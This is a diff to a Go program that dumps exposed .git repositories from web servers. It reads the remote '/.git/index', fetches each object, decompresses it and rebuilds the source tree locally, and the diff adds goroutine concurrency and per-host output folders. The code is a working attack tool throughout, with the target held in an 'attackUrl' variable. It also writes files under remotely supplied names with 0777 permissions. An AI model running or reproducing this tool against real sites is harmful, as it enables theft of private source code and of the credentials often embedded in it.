@@ -3,14 +3,21 @@ package main
 import (
     "fmt"
     "os"
+    "sync"
+    "runtime"
+    "strings"
     "bytes"
+    "net/url"
     "net/http"
     "io/ioutil"
     "compress/zlib"
     "encoding/binary"
 )
 
-var url string = "http://localhost/.git"
+var (
+    attackUrl string = "http://localhost/.git"
+    wg sync.WaitGroup
+)
 
 const (
     headSize  = 12
@@ -115,16 +122,51 @@ func UnzipBytes(input []byte) []byte {
     return data
 }
 
-func TaskFunc(cb ceBody) {
-    fileName := cb.Name
-    fileSize := cb.EntryBody.Size
+func SplitFunc(s rune) bool {
+    if s == '/' { return true }
+    return false
+}
 
-    prefix, suffix :=  Bytes2Sha1(cb.EntryBody.Sha1)
-    url := fmt.Sprintf("%s/objects/%s/%s", url, prefix, suffix)
-    ret := HttpGet(url)
+func GetPathDir(path string) string {
+    list := strings.FieldsFunc(path, SplitFunc)
+    if length := len(list); length != 1 {
+        return strings.Join(list[:length-1], "/")
+    } else { return "./" }
+}
+
+func MkdirFromPath(path string){
+    if dir := GetPathDir(path); dir != "./" {
+        if err := os.MkdirAll(dir, 0777); err != nil {
+            panic(err)
+        }
+    }
+}
+
+func GetBlobHeadLen(cb ceBody) int {
+    fileSize := cb.EntryBody.Size
     blobHead := fmt.Sprintf("blob %d", fileSize)
-    blobHeadLen := len(blobHead) + 1
-    ioutil.WriteFile(fileName, UnzipBytes(ret)[blobHeadLen:], 0666)
+    return len(blobHead) + 1 /*结尾有个'\0'字符*/
+}
+
+func GetObject(cb ceBody) []byte {
+    prefix, suffix :=  Bytes2Sha1(cb.EntryBody.Sha1)
+    url := fmt.Sprintf("%s/objects/%s/%s", attackUrl, prefix, suffix)
+    return HttpGet(url)
+}
+
+func Write(path string, content []byte, length int) {
+    MkdirFromPath(path)
+    if err := ioutil.WriteFile(path, UnzipBytes(content)[length:], 0777); err != nil {
+        fmt.Println(err)
+    }
+}
+
+func TaskFunc(cb ceBody) {
+    defer wg.Done()
+
+    zipBytes := GetObject(cb)
+    blobHeadLen := GetBlobHeadLen(cb)
+    Write(cb.Name, zipBytes, blobHeadLen)
 }
 
 func ParseIndex(index []byte) {
@@ -132,6 +174,8 @@ func ParseIndex(index []byte) {
     var thisEntryBody entryBody
     var thisEntrySize int
     binary.Read(bytes.NewBuffer(index), binary.BigEndian, &h)
+
+    runtime.GOMAXPROCS(20) /*协程数量*/
 
     var offset int = headSize
     if CheckSign(h.Sign[:]) && CheckVersion(h.Version) {
@@ -145,15 +189,37 @@ func ParseIndex(index []byte) {
                 thisEntrySize += thisEntryNameLen
                 PadEntry(index, &offset, thisEntrySize) /*每个entry都为8的整数倍*/
                 entry := ceBody{thisEntryBody, thisEntrySize, thisEntryName}
-                TaskFunc(entry)
+                wg.Add(1)
+                fmt.Println(thisEntryName)
+                go TaskFunc(entry)
             } else { /* good luck */}
         }
+        wg.Wait()
     } else {
       os.Exit(-1)
     }
 }
 
-func main() {
-    index := HttpGet(url + "/index")
+func GetHostFromUrl(attackUrl string) string {
+    if u, err := url.Parse(attackUrl); err != nil {
+        panic(err)
+    } else {
+        return  u.Host
+    }
+}
+
+func run(index []byte) {
+    host := GetHostFromUrl(attackUrl)
+    if err := os.MkdirAll(host, 0777); err != nil {
+        panic(err)
+    }
+    if err := os.Chdir(host); err != nil {
+        panic(err)
+    }
     ParseIndex(index)
+}
+
+func main() {
+    index := HttpGet(attackUrl + "/index")
+    run(index)
 }
